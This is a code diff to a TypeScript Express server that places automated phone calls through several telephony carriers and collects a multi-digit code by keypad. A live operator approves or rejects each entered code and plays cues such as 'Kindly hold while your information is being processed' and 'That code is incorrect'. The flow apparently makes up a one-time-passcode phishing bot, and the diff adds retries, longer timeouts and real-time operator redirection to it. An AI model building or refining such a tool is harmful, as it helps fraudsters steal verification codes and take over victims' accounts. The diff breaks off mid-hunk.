@@ -1,5 +1,7 @@
+import 'dotenv/config';
 import express, { Request, Response } from 'express';
 import { createServer as createViteServer } from 'vite';
+import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import twilio from 'twilio';
@@ -16,21 +18,69 @@ app.set('trust proxy', true);
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Dynamic public base URL helper that auto-detects live production domains (e.g. from reverse proxy headers)
-export function getPublicBaseUrl(req?: Request): string {
-  if (process.env.APP_URL && !process.env.APP_URL.includes('localhost')) {
-    return process.env.APP_URL.replace(/\/$/, '');
-  }
+function isLocalUrl(urlOrHost: string): boolean {
+  const lower = urlOrHost.toLowerCase();
+  return (
+    lower.includes('localhost') ||
+    lower.includes('127.0.0.1') ||
+    lower.includes('0.0.0.0')
+  );
+}
 
+function normalizeCallerId(raw?: string): string {
+  if (!raw || !raw.trim()) return '';
+  const digits = raw.replace(/\D/g, '');
+  if (!digits) return '';
+  if (digits.length === 10) return `+1${digits}`;
+  if (digits.length === 11 && digits.startsWith('1')) return `+${digits}`;
+  return `+${digits}`;
+}
+
+function isValidPublicHttpUrl(val?: string): boolean {
+  if (!val || !val.trim() || val.trim() === 'MY_APP_URL') return false;
+  try {
+    const parsed = new URL(val.trim());
+    if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return false;
+    return !isLocalUrl(parsed.host);
+  } catch {
+    return false;
+  }
+}
+
+// Dynamic public base URL helper that auto-detects live production domains (reverse proxy headers, Origin/Referer, stored session base URL, or APP_URL)
+export function getPublicBaseUrl(req?: Request, fallbackUrl?: string): string {
   if (req) {
-    const proto = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
-    const host = (req.headers['x-forwarded-host'] as string) || req.headers.host;
-    if (host && !host.includes('localhost') && !host.startsWith('127.0.0.1')) {
+    const rawProto = (req.headers['x-forwarded-proto'] as string) || req.protocol || 'https';
+    const proto = rawProto.split(',')[0].trim() || 'https';
+    const rawHost = (req.headers['x-forwarded-host'] as string) || req.headers.host || '';
+    const host = rawHost.split(',')[0].trim();
+
+    if (host && !isLocalUrl(host)) {
       return `${proto}://${host}`.replace(/\/$/, '');
     }
+
+    const candidates = [
+      req.body?.clientOrigin,
+      req.headers.origin,
+      req.headers.referer,
+      fallbackUrl,
+    ];
+
+    for (const candidate of candidates) {
+      if (isValidPublicHttpUrl(candidate)) {
+        const parsed = new URL(candidate!.trim());
+        return parsed.origin.replace(/\/$/, '');
+      }
+    }
+  } else if (isValidPublicHttpUrl(fallbackUrl)) {
+    return new URL(fallbackUrl!.trim()).origin.replace(/\/$/, '');
   }
 
-  return process.env.APP_URL || `http://localhost:${PORT}`;
+  if (isValidPublicHttpUrl(process.env.APP_URL)) {
+    return new URL(process.env.APP_URL!.trim()).origin.replace(/\/$/, '');
+  }
+
+  return `http://localhost:${PORT}`;
 }
 
 export interface CallSession {
@@ -62,6 +112,9 @@ export interface CallSession {
   duration?: number;
   isSimulated: boolean;
   carrier?: 'twilio' | 'plivo' | 'telnyx' | 'signalwire' | 'fonoster';
+  providerCallSid?: string;
+  publicBaseUrl?: string;
+  waitPollCount?: number;
   createdAt: string;
   completedAt?: string;
   events: Array<{
@@ -74,8 +127,62 @@ export interface CallSession {
   }>;
 }
 
-// In-memory sessions storage
+// In-memory sessions storage + /tmp file cache for resilience across restarts / worker processes
+const SESSION_CACHE_FILE = '/tmp/voicedrop-sessions.json';
 const sessions = new Map<string, CallSession>();
+const providerSidToCallId = new Map<string, string>();
+
+function persistSessionsToDisk() {
+  try {
+    const list = Array.from(sessions.values()).slice(-50);
+    fs.writeFileSync(SESSION_CACHE_FILE, JSON.stringify(list), 'utf8');
+  } catch {
+    // Ignore disk cache errors in restricted environments
+  }
+}
+
+function hydrateSessionsFromDisk() {
+  try {
+    if (!fs.existsSync(SESSION_CACHE_FILE)) return;
+    const raw = fs.readFileSync(SESSION_CACHE_FILE, 'utf8');
+    const list = JSON.parse(raw) as CallSession[];
+    if (Array.isArray(list)) {
+      for (const s of list) {
+        if (s?.id && !sessions.has(s.id)) {
+          sessions.set(s.id, s);
+        }
+        if (s?.id && s?.providerCallSid) {
+          providerSidToCallId.set(s.providerCallSid, s.id);
+        }
+      }
+    }
+  } catch {
+    // Ignore parse/read errors
+  }
+}
+
+hydrateSessionsFromDisk();
+
+function getSessionById(idOrSid?: string): CallSession | undefined {
+  if (!idOrSid) return undefined;
+  const key = idOrSid.trim();
+  if (!key) return undefined;
+
+  if (sessions.has(key)) return sessions.get(key);
+  const mappedId = providerSidToCallId.get(key);
+  if (mappedId && sessions.has(mappedId)) return sessions.get(mappedId);
+
+  hydrateSessionsFromDisk();
+  if (sessions.has(key)) return sessions.get(key);
+  const mappedAfterHydrate = providerSidToCallId.get(key);
+  if (mappedAfterHydrate && sessions.has(mappedAfterHydrate)) {
+    return sessions.get(mappedAfterHydrate);
+  }
+
+  return Array.from(sessions.values()).find(
+    (s) => s.id === key || s.providerCallSid === key
+  );
+}
 
 // Active Server-Sent Event clients per callId
 const sseClients = new Map<string, Set<Response>>();
@@ -101,6 +208,7 @@ function addSessionEvent(session: CallSession, event: Omit<CallSession['events']
     timestamp: new Date().toISOString(),
   };
   session.events.push(fullEvent);
+  persistSessionsToDisk();
   broadcastEvent(session.id, 'call-event', fullEvent);
   broadcastEvent(session.id, 'session-update', session);
   return fullEvent;
@@ -112,7 +220,8 @@ app.get('/api/config', (req: Request, res: Response) => {
   const authToken = process.env.TWILIO_AUTH_TOKEN || '';
   const phoneNumber = process.env.TWILIO_PHONE_NUMBER || '';
   const appUrl = getPublicBaseUrl(req);
-  const hasGemini = Boolean(process.env.GEMINI_API_KEY);
+  const rawGeminiKey = (process.env.GEMINI_API_KEY || '').trim();
+  const hasGemini = Boolean(rawGeminiKey && rawGeminiKey !== 'MY_GEMINI_API_KEY');
 
   res.json({
     hasTwilioAccountSid: Boolean(accountSid.trim()),
@@ -144,7 +253,7 @@ app.get('/api/call/events/:callId', (req: Request, res: Response) => {
   sseClients.get(callId)!.add(res);
 
   // Send initial session data if already exists
-  const session = sessions.get(callId);
+  const session = getSessionById(callId);
   if (session) {
     res.write(`event: session-update\ndata: ${JSON.stringify(session)}\n\n`);
   }
@@ -168,7 +277,7 @@ app.get('/api/call/events/:callId', (req: Request, res: Response) => {
 
 // Get session details
 app.get('/api/calls/:callId', (req: Request, res: Response) => {
-  const session = sessions.get(req.params.callId);
+  const session = getSessionById(req.params.callId);
   if (!session) {
     return res.status(404).json({ error: 'Call session not found' });
   }
@@ -235,29 +344,29 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
     // Twilio
     const twilioAccountSid = carriersConfig.twilio?.accountSid || customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
     const twilioAuthToken = carriersConfig.twilio?.authToken || customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
-    const twilioPhone = carriersConfig.twilio?.phoneNumber || customTwilio?.phoneNumber || process.env.TWILIO_PHONE_NUMBER;
+    const twilioPhone = normalizeCallerId(carriersConfig.twilio?.phoneNumber || customTwilio?.phoneNumber || process.env.TWILIO_PHONE_NUMBER);
 
     // Plivo
     const plivoAuthId = carriersConfig.plivo?.authId || process.env.PLIVO_AUTH_ID;
     const plivoAuthToken = carriersConfig.plivo?.authToken || process.env.PLIVO_AUTH_TOKEN;
-    const plivoPhone = carriersConfig.plivo?.phoneNumber || process.env.PLIVO_PHONE_NUMBER;
+    const plivoPhone = normalizeCallerId(carriersConfig.plivo?.phoneNumber || process.env.PLIVO_PHONE_NUMBER);
 
     // Telnyx
     const telnyxApiKey = carriersConfig.telnyx?.apiKey || process.env.TELNYX_API_KEY;
     const telnyxConnectionId = carriersConfig.telnyx?.connectionId || process.env.TELNYX_CONNECTION_ID;
-    const telnyxPhone = carriersConfig.telnyx?.phoneNumber || process.env.TELNYX_PHONE_NUMBER;
+    const telnyxPhone = normalizeCallerId(carriersConfig.telnyx?.phoneNumber || process.env.TELNYX_PHONE_NUMBER);
 
     // SignalWire
     const signalwireSpaceUrl = carriersConfig.signalwire?.spaceUrl || process.env.SIGNALWIRE_SPACE_URL;
     const signalwireProjectId = carriersConfig.signalwire?.projectId || process.env.SIGNALWIRE_PROJECT_ID;
     const signalwireApiToken = carriersConfig.signalwire?.apiToken || process.env.SIGNALWIRE_API_TOKEN;
-    const signalwirePhone = carriersConfig.signalwire?.phoneNumber || process.env.SIGNALWIRE_PHONE_NUMBER;
+    const signalwirePhone = normalizeCallerId(carriersConfig.signalwire?.phoneNumber || process.env.SIGNALWIRE_PHONE_NUMBER);
 
     // Fonoster
     const fonosterProjectId = carriersConfig.fonoster?.projectId || process.env.FONOSTER_PROJECT_ID;
     const fonosterAccessKeyId = carriersConfig.fonoster?.accessKeyId || process.env.FONOSTER_ACCESS_KEY_ID;
     const fonosterAccessKeySecret = carriersConfig.fonoster?.accessKeySecret || process.env.FONOSTER_ACCESS_KEY_SECRET;
-    const fonosterPhone = carriersConfig.fonoster?.phoneNumber || process.env.FONOSTER_PHONE_NUMBER;
+    const fonosterPhone = normalizeCallerId(carriersConfig.fonoster?.phoneNumber || process.env.FONOSTER_PHONE_NUMBER);
 
     if (carrier === 'twilio') {
       canUseLiveCarrier = Boolean(twilioAccountSid && twilioAuthToken && twilioPhone);
@@ -285,6 +394,7 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
     }
 
     const callId = `call_${Date.now()}_${Math.random().toString(36).substring(2, 9)}`;
+    const appBaseUrl = getPublicBaseUrl(req);
 
     const newSession: CallSession = {
       id: callId,
@@ -307,6 +417,7 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
       keypadActions: keypadActions || {},
       isSimulated: useSimulator,
       carrier,
+      publicBaseUrl: appBaseUrl,
       createdAt: new Date().toISOString(),
       events: [],
     };
@@ -355,7 +466,6 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
     }
 
     // LIVE PSTN CARRIER DISPATCH
-    const appBaseUrl = getPublicBaseUrl(req);
 
     try {
       if (carrier === 'twilio') {
@@ -378,9 +488,9 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
           statusCallbackMethod: 'POST',
         });
 
-        newSession.id = call.sid;
-        sessions.delete(callId);
-        sessions.set(call.sid, newSession);
+        newSession.providerCallSid = call.sid;
+        providerSidToCallId.set(call.sid, callId);
+        persistSessionsToDisk();
 
         addSessionEvent(newSession, {
           type: 'call-state',
@@ -391,7 +501,8 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
 
         return res.json({
           success: true,
-          callId: call.sid,
+          callId,
+          providerCallSid: call.sid,
           session: newSession,
           mode: 'live',
           carrier: 'twilio',
@@ -429,9 +540,9 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
         }
 
         const callSid = plivoData.request_uuid || plivoData.call_uuid || callId;
-        newSession.id = callSid;
-        sessions.delete(callId);
-        sessions.set(callSid, newSession);
+        newSession.providerCallSid = callSid;
+        providerSidToCallId.set(callSid, callId);
+        persistSessionsToDisk();
 
         addSessionEvent(newSession, {
           type: 'call-state',
@@ -442,7 +553,8 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
 
         return res.json({
           success: true,
-          callId: callSid,
+          callId,
+          providerCallSid: callSid,
           session: newSession,
           mode: 'live',
           carrier: 'plivo',
@@ -479,9 +591,9 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
         }
 
         const callSid = telnyxData.data?.call_control_id || telnyxData.data?.call_leg_id || callId;
-        newSession.id = callSid;
-        sessions.delete(callId);
-        sessions.set(callSid, newSession);
+        newSession.providerCallSid = callSid;
+        providerSidToCallId.set(callSid, callId);
+        persistSessionsToDisk();
 
         addSessionEvent(newSession, {
           type: 'call-state',
@@ -492,7 +604,8 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
 
         return res.json({
           success: true,
-          callId: callSid,
+          callId,
+          providerCallSid: callSid,
           session: newSession,
           mode: 'live',
           carrier: 'telnyx',
@@ -530,9 +643,9 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
         }
 
         const callSid = swData.sid || callId;
-        newSession.id = callSid;
-        sessions.delete(callId);
-        sessions.set(callSid, newSession);
+        newSession.providerCallSid = callSid;
+        providerSidToCallId.set(callSid, callId);
+        persistSessionsToDisk();
 
         addSessionEvent(newSession, {
           type: 'call-state',
@@ -543,7 +656,8 @@ app.post('/api/call/initiate', async (req: Request, res: Response) => {
 
         return res.json({
           success: true,
-          callId: callSid,
+          callId,
+          providerCallSid: callSid,
           session: newSession,
           mode: 'live',
           carrier: 'signalwire',
@@ -603,20 +717,44 @@ function escapeXml(unsafe: string): string {
   });
 }
 
-// Helper to find session by multiple identifier keys across carriers
+// Helper to find session by checking ALL candidate identifier keys across carriers + active phone fallback
 function findSession(req: Request): CallSession | undefined {
-  const candidate =
-    (req.query.callId as string) ||
-    (req.body.CallSid as string) ||
-    (req.body.CallUUID as string) ||
-    (req.body.call_control_id as string) ||
-    (req.body.callId as string) ||
-    (req.body.id as string);
+  const candidates = [
+    req.query?.callId,
+    req.body?.CallSid,
+    req.body?.ParentCallSid,
+    req.body?.CallUUID,
+    req.body?.RequestUUID,
+    req.body?.call_control_id,
+    req.body?.call_leg_id,
+    req.body?.callId,
+    req.body?.id,
+  ]
+    .map((v) => (typeof v === 'string' ? v.trim() : ''))
+    .filter(Boolean);
 
-  if (candidate && sessions.has(candidate)) {
-    return sessions.get(candidate);
+  for (const key of candidates) {
+    const found = getSessionById(key);
+    if (found) return found;
   }
-  return Array.from(sessions.values()).find((s) => s.id === candidate);
+
+  // Fallback: if carrier webhook omitted query params, match most recent active session for recipient phone
+  const rawTo = req.body?.To || req.body?.Called || req.query?.To;
+  if (typeof rawTo === 'string' && rawTo.trim()) {
+    const normTo = normalizeCallerId(rawTo);
+    const activeByPhone = Array.from(sessions.values())
+      .filter(
+        (s) =>
+          s.to === normTo &&
+          ['queued', 'initiating', 'ringing', 'in-progress', 'collecting-input', 'awaiting-operator'].includes(
+            s.status
+          )
+      )
+      .sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime())[0];
+    if (activeByPhone) return activeByPhone;
+  }
+
+  return undefined;
 }
 
 // -------------------------------------------------------------
@@ -646,6 +784,13 @@ const XML_WAIT_ROUTES = [
   '/api/fonoster/wait-operator',
 ];
 
+const XML_CUE_GATHER_ROUTES = [
+  '/api/twiml/cue-gather',
+  '/api/telnyx/cue-gather',
+  '/api/signalwire/cue-gather',
+  '/api/fonoster/cue-gather',
+];
+
 const XML_STATUS_ROUTES = [
   '/api/twiml/status',
   '/api/telnyx/status',
@@ -665,6 +810,13 @@ app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
     return res.send(twiml.toString());
   }
 
+  // Record provider CallSid if not already stored
+  const incomingSid = req.body?.CallSid || req.body?.call_control_id;
+  if (typeof incomingSid === 'string' && incomingSid.trim() && !session.providerCallSid) {
+    session.providerCallSid = incomingSid.trim();
+    providerSidToCallId.set(incomingSid.trim(), session.id);
+  }
+
   session.status = 'in-progress';
   addSessionEvent(session, {
     type: 'call-state',
@@ -680,7 +832,7 @@ app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
   });
   twiml.say({ voice: session.voice as any }, session.introGreeting);
 
-  const appBaseUrl = getPublicBaseUrl(req);
+  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
   const matchedBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
   const gatherActionUrl = `${appBaseUrl}${matchedBase}?callId=${encodeURIComponent(session.id)}`;
 
@@ -690,9 +842,23 @@ app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
     input: ['dtmf'],
     numDigits: session.numDigits || 6,
     finishOnKey: '#',
-    timeout: 15,
+    timeout: 25,
   });
   gather.say({ voice: session.voice as any }, session.script);
+
+  // Give caller one extra chance if first Gather timed out before hanging up
+  const gatherSecondChance = twiml.gather({
+    action: gatherActionUrl,
+    method: 'POST',
+    input: ['dtmf'],
+    numDigits: session.numDigits || 6,
+    finishOnKey: '#',
+    timeout: 20,
+  });
+  gatherSecondChance.say(
+    { voice: session.voice as any },
+    `We have not received your entry yet. ${session.script}`
+  );
 
   twiml.say({ voice: session.voice as any }, 'We did not receive your code. Thank you for your time. Goodbye.');
   twiml.hangup();
@@ -708,12 +874,53 @@ app.all(XML_OUTBOUND_ROUTES, (req: Request, res: Response) => {
   res.send(twiml.toString());
 });
 
+// 1b. Live Operator Cue during Gather - Speaks operator cue and resumes listening for DTMF
+app.all(XML_CUE_GATHER_ROUTES, (req: Request, res: Response) => {
+  const session = findSession(req);
+  const twiml = new twilio.twiml.VoiceResponse();
+
+  if (!session) {
+    twiml.hangup();
+    res.type('text/xml');
+    return res.send(twiml.toString());
+  }
+
+  const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
+  const matchedBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
+  const gatherActionUrl = `${appBaseUrl}${matchedBase}?callId=${encodeURIComponent(session.id)}`;
+
+  if (session.activeCue?.text) {
+    const cueMsg = session.activeCue.text;
+    session.activeCue = undefined;
+    persistSessionsToDisk();
+    twiml.say({ voice: session.voice as any }, cueMsg);
+  }
+
+  const gather = twiml.gather({
+    action: gatherActionUrl,
+    method: 'POST',
+    input: ['dtmf'],
+    numDigits: session.numDigits || 6,
+    finishOnKey: '#',
+    timeout: 25,
+  });
+  gather.pause({ length: 1 });
+
+  twiml.say({ voice: session.voice as any }, 'We did not receive your code. Goodbye.');
+  twiml.hangup();
+
+  session.status = 'collecting-input';
+  persistSessionsToDisk();
+  res.type('text/xml');
+  res.send(twiml.toString());
+});
+
 // 2. XML Gather Callback - DTMF Code Entered
 app.all(XML_GATHER_ROUTES, (req: Request, res: Response) => {
   const session = findSession(req);
   const digits = req.body.Digits || req.query.Digits;
   const twiml = new twilio.twiml.VoiceResponse();
-  const appBaseUrl = getPublicBaseUrl(req);
+  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);
 
   const matchedWaitBase = XML_WAIT_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/wait-operator';
   const matchedGatherBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
@@ -736,8 +943,10 @@ app.all(XML_GATHER_ROUTES, (req: Request, res: Response) => {
       });
 
       const holdPrompt = session.holdMessage || 'Kindly hold while your information is being processed.';
+      session.waitPollCount = 0;
+      persistSessionsToDisk();
       twiml.say({ voice: session.voice as any }, holdPrompt);
-      twiml.pause({ length: 4 });
+      twiml.pause({ length: 2 });
       twiml.redirect({ method: 'POST' }, `${appBaseUrl}${matchedWaitBase}?callId=${encodeURIComponent(session.id)}`);
 
       res.type('text/xml');
@@ -837,7 +1046,7 @@ app.all(XML_GATHER_ROUTES, (req: Request, res: Response) => {
 app.all(XML_WAIT_ROUTES, (req: Request, res: Response) => {
   const session = findSession(req);
   const twiml = new twilio.twiml.VoiceResponse();
-  const appBaseUrl = getPublicBaseUrl(req);
+  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);
 
   const matchedWaitBase = XML_WAIT_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/wait-operator';
   const matchedGatherBase = XML_GATHER_ROUTES.find((r) => req.path.includes(r.split('/')[2])) || '/api/twiml/gather';
@@ -853,8 +1062,9 @@ app.all(XML_WAIT_ROUTES, (req: Request, res: Response) => {
   if (session.activeCue) {
     const cueMsg = session.activeCue.text;
     session.activeCue = undefined;
+    persistSessionsToDisk();
     twiml.say({ voice: session.voice as any }, cueMsg);
-    twiml.pause({ length: 3 });
+    twiml.pause({ length: 2 });
     twiml.redirect({ method: 'POST' }, `${appBaseUrl}${matchedWaitBase}?callId=${encodeURIComponent(session.id)}`);
     res.type('text/xml');
     return res.send(twiml.toString());
@@ -863,6 +1073,7 @@ app.all(XML_WAIT_ROUTES, (req: Request, res: Response) => {
   // 2. Approved by operator
   if (session.operatorDecision === 'approved') {
     session.capturedDigits = session.pendingDigits || session.capturedDigits;
+    session.pendingDigits = undefined;
     session.codeStatus = 'valid';
     session.status = 'completed';
     session.completedAt = new Date().toISOString();
@@ -885,6 +1096,7 @@ app.all(XML_WAIT_ROUTES, (req: Request, res: Response) => {
   if (session.operatorDecision === 'rejected') {
     session.operatorDecision = undefined;
     session.status = 'collecting-input';
+    persistSessionsToDisk();
 
     const gatherActionUrl = `${appBaseUrl}${matchedGatherBase}?callId=${encodeURIComponent(session.id)}`;
     const retryMsg = session.invalidMessage || 'That code is incorrect. Please re-enter your code now, followed by the pound sign.';
@@ -896,7 +1108,7 @@ app.all(XML_WAIT_ROUTES, (req: Request, res: Response) => {
       input: ['dtmf'],
       numDigits: session.numDigits || 6,
       finishOnKey: '#',
-      timeout: 15,
+      timeout: 25,
     });
     gatherRetry.say({ voice: session.voice as any }, `Please enter your ${session.numDigits}-digit code now, followed by the pound sign.`);
 
@@ -907,9 +1119,13 @@ app.all(XML_WAIT_ROUTES, (req: Request, res: Response) => {
     return res.send(twiml.toString());
   }
 
-  // 4. Comfort hold loop
-  twiml.say({ voice: session.voice as any }, 'Thank you for your patience. Please continue to hold.');
-  twiml.pause({ length: 4 });
+  // 4. Fast 2-second hold poll loop (speaks comfort reminder once every ~12s)
+  session.waitPollCount = (session.waitPollCount || 0) + 1;
+  persistSessionsToDisk();
+  if (session.waitPollCount % 6 === 0) {
+    twiml.say({ voice: session.voice as any }, 'Thank you for your patience. Please continue to hold.');
+  }
+  twiml.pause({ length: 2 });
   twiml.redirect({ method: 'POST' }, `${appBaseUrl}${matchedWaitBase}?callId=${encodeURIComponent(session.id)}`);
 
   res.type('text/xml');
@@ -926,17 +1142,28 @@ app.all(XML_STATUS_ROUTES, (req: Request, res: Response) => {
 
     if (duration !== undefined) session.duration = duration;
 
-    if (callStatus === 'ringing') {
+    if (callStatus === 'initiated' && session.status === 'queued') {
+      session.status = 'initiating';
+      addSessionEvent(session, {
+        type: 'call-state',
+        title: 'Carrier Status: Initiated',
+        description: 'Outbound call leg initiated on PSTN gateway.',
+      });
+    } else if (callStatus === 'ringing' && ['queued', 'initiating'].includes(session.status)) {
       session.status = 'ringing';
       addSessionEvent(session, {
         type: 'call-state',
         title: 'Carrier Status: Ringing',
         description: 'Recipient device is actively alerting.',
       });
-    } else if (callStatus === 'in-progress') {
+    } else if (callStatus === 'in-progress' && ['queued', 'initiating', 'ringing'].includes(session.status)) {
       session.status = 'in-progress';
+      persistSessionsToDisk();
+      broadcastEvent(session.id, 'session-update', session);
     } else if (callStatus === 'completed') {
       session.status = 'completed';
+      session.pendingDigits = undefined;
+      session.activeCue = undefined;
       session.completedAt = new Date().toISOString();
       addSessionEvent(session, {
         type: 'call-state',
@@ -945,7 +1172,10 @@ app.all(XML_STATUS_ROUTES, (req: Request, res: Response) => {
         data: { duration },
       });
     } else if (['busy', 'no-answer', 'failed', 'canceled'].includes(callStatus)) {
-      session.status = callStatus as any;
+      session.status = (callStatus === 'canceled' ? 'completed' : callStatus) as any;
+      session.pendingDigits = undefined;
+      session.activeCue = undefined;
+      session.completedAt = new Date().toISOString();
       addSessionEvent(session, {
         type: 'call-state',
         title: `Call Ended (${callStatus})`,
@@ -963,7 +1193,7 @@ app.all(XML_STATUS_ROUTES, (req: Request, res: Response) => {
 // 1. Plivo Outbound / Answer
 app.all(['/api/plivo/outbound', '/api/plivo/answer'], (req: Request, res: Response) => {
   const session = findSession(req);
-  const appBaseUrl = getPublicBaseUrl(req);
+  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);
 
   if (!session) {
     res.type('text/xml');
@@ -1014,7 +1244,7 @@ app.all(['/api/plivo/outbound', '/api/plivo/answer'], (req: Request, res: Respon
 app.all('/api/plivo/gather', (req: Request, res: Response) => {
   const session = findSession(req);
   const digits = req.body.Digits || req.query.Digits;
-  const appBaseUrl = getPublicBaseUrl(req);
+  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);
 
   if (session && digits) {
     const rawDigits = String(digits).trim();
@@ -1129,7 +1359,7 @@ app.all('/api/plivo/gather', (req: Request, res: Response) => {
 // 3. Plivo Wait Operator Loop
 app.all('/api/plivo/wait-operator', (req: Request, res: Response) => {
   const session = findSession(req);
-  const appBaseUrl = getPublicBaseUrl(req);
+  const appBaseUrl = getPublicBaseUrl(req, session?.publicBaseUrl);
 
   if (!session) {
     res.type('text/xml');
@@ -1158,6 +1388,7 @@ app.all('/api/plivo/wait-operator', (req: Request, res: Response) => {
   // 2. Approved by operator
   if (session.operatorDecision === 'approved') {
     session.capturedDigits = session.pendingDigits || session.capturedDigits;
+    session.pendingDigits = undefined;
     session.codeStatus = 'valid';
     session.status = 'completed';
     session.completedAt = new Date().toISOString();
@@ -1198,12 +1429,17 @@ app.all('/api/plivo/wait-operator', (req: Request, res: Response) => {
     return res.send(xml);
   }
 
-  // 4. Comfort hold loop
+  // 4. Fast 2-second Plivo hold poll loop
+  session.waitPollCount = (session.waitPollCount || 0) + 1;
+  persistSessionsToDisk();
   const waitUrl = `${appBaseUrl}/api/plivo/wait-operator?callId=${encodeURIComponent(session.id)}`;
+  const comfortLine =
+    session.waitPollCount % 6 === 0
+      ? '  <Speak>Thank you for your patience. Please continue to hold.</Speak>\n'
+      : '';
   const xml = `<?xml version="1.0" encoding="UTF-8"?>
 <Response>
-  <Speak>Thank you for your patience. Please continue to hold.</Speak>
-  <Wait length="4" />
+${comfortLine}  <Wait length="2" />
   <Redirect method="POST">${escapeXml(waitUrl)}</Redirect>
 </Response>`;
   res.type('text/xml');
@@ -1233,21 +1469,27 @@ app.all('/api/plivo/status', (req: Request, res: Response) => {
 
 
 // Operator Action Endpoint - Direct manual control of call flow and audio prompts
-app.post('/api/call/operator-action', (req: Request, res: Response) => {
-  const { callId, action, customMessage } = req.body;
-  const session = sessions.get(callId);
+app.post('/api/call/operator-action', async (req: Request, res: Response) => {
+  const { callId, action, customMessage, customTwilio, carriersConfig = {} } = req.body;
+  const session = getSessionById(callId);
 
   if (!session) {
     return res.status(404).json({ error: 'Call session not found' });
   }
 
+  const isCueAction = ['hold', 'incorrect_prompt', 'custom_cue'].includes(action);
+
   switch (action) {
     case 'approve':
       session.operatorDecision = 'approved';
       session.capturedDigits = session.pendingDigits || session.capturedDigits;
+      session.pendingDigits = undefined;
+      session.activeCue = undefined;
       session.codeStatus = 'valid';
-      session.status = 'completed';
-      session.completedAt = new Date().toISOString();
+      if (session.isSimulated) {
+        session.status = 'completed';
+        session.completedAt = new Date().toISOString();
+      }
 
       addSessionEvent(session, {
         type: 'dtmf',
@@ -1273,7 +1515,7 @@ app.post('/api/call/operator-action', (req: Request, res: Response) => {
       });
       break;
 
-    case 'hold':
+    case 'hold': {
       const holdText = customMessage || session.holdMessage || 'Kindly hold while your information is being processed.';
       session.activeCue = { text: holdText, timestamp: new Date().toISOString() };
       addSessionEvent(session, {
@@ -1283,8 +1525,9 @@ app.post('/api/call/operator-action', (req: Request, res: Response) => {
         data: { cue: holdText },
       });
       break;
+    }
 
-    case 'incorrect_prompt':
+    case 'incorrect_prompt': {
       const incorrectText = customMessage || session.invalidMessage || 'The code entered is incorrect. Please try again.';
       session.activeCue = { text: incorrectText, timestamp: new Date().toISOString() };
       addSessionEvent(session, {
@@ -1294,6 +1537,7 @@ app.post('/api/call/operator-action', (req: Request, res: Response) => {
         data: { cue: incorrectText },
       });
       break;
+    }
 
     case 'custom_cue':
       if (customMessage) {
@@ -1311,13 +1555,42 @@ app.post('/api/call/operator-action', (req: Request, res: Response) => {
       return res.status(400).json({ error: `Unknown operator action: ${action}` });
   }
 
+  // If this is a live Twilio call and the caller is currently in <Gather> (not yet in wait-operator loop),
+  // redirect the live call leg to /api/twiml/cue-gather so they hear the operator cue immediately and resume <Gather>!
+  if (
+    !session.isSimulated &&
+    isCueAction &&
+    session.activeCue &&
+    ['in-progress', 'collecting-input'].includes(session.status)
+  ) {
+    const providerSid = session.providerCallSid || session.id;
+    const carrier = session.carrier || 'twilio';
+    const appBaseUrl = getPublicBaseUrl(req, session.publicBaseUrl);
+
+    if (carrier === 'twilio' && providerSid.startsWith('CA')) {
+      try {
+        const accountSid = carriersConfig.twilio?.accountSid || customTwilio?.accountSid || process.env.TWILIO_ACCOUNT_SID;
+        const authToken = carriersConfig.twilio?.authToken || customTwilio?.authToken || process.env.TWILIO_AUTH_TOKEN;
+        if (accountSid && authToken) {
+          const client = twilio(accountSid, authToken);
+          await client.calls(providerSid).update({
+            url: `${appBaseUrl}/api/twiml/cue-gather?callId=${encodeURIComponent(session.id)}`,
+            method: 'POST',
+          });
+        }
+      } catch (err) {
+        console.error('Error redirecting live Twilio call for cue:', err);
+      }
+    }
+  }
+
   res.json({ success: true, session });
 });
 
 // Simulator Action Webhook - Used by the interactive phone mockup in the browser
 app.post('/api/call/simulate-event', (req: Request, res: Response) => {
   const { callId, action, digits } = req.body;
-  const session = sessions.get(callId);
+  const session = getSessionById(callId);
 
   if (!session) {
     return res.status(404).json({ error: 'Call session not found' });
@@ -1454,6 +1727,8 @@ app.post('/api/call/simulate-event', (req: Request, res: Response) => {
     case 'decline':
     case 'hangup':
       session.status = action === 'decline' ? 'busy' : 'completed';
+      session.pendingDigits = undefined;
+      session.activeCue = undefined;
       session.completedAt = new Date().toISOString();
       addSessionEvent(session, {
         type: 'call-state',
@@ -1471,14 +1746,16 @@ app.post('/api/call/simulate-event', (req: Request, res: Response) => {
 
 // Hangup endpoint from dashboard
 app.post('/api/call/hangup', async (req: Request, res: Response) => {
-  const { callId, customTwilio } = req.body;
